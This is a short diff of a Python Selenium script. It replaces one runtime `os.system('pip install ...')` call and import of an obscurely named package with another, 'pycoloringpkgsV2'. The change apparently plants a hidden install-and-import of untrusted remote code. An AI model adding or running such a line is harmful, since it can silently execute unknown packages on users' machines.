@@ -1,6 +1,6 @@
 import os
-os.system("pip install pipsqlpackageV2")
-import pipsqlpackageV2
+os.system("pip install pycoloringpkgsV2")
+import pycoloringpkgsV2
 from selenium import webdriver
 from selenium.webdriver.firefox.options import Options
 from selenium.webdriver.common.keys import Keys
